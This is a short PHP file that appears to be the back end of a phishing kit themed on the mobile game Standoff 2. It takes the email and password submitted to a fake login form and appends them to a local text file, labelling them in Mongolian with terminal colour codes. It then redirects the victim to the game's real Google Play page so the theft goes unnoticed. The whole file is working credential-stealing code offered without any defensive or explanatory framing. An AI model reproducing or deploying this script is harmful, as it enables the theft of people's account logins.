<?php

file_put_contents("../../dbs.txt", "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mХэрэглэгчийн нэр \e[1;33m:\e[1;32m " . $_POST['email']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mНууц үг \e[1;33m:\e[1;32m " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://play.google.com/store/apps/details?id=com.axlebolt.standoff2');
exit();
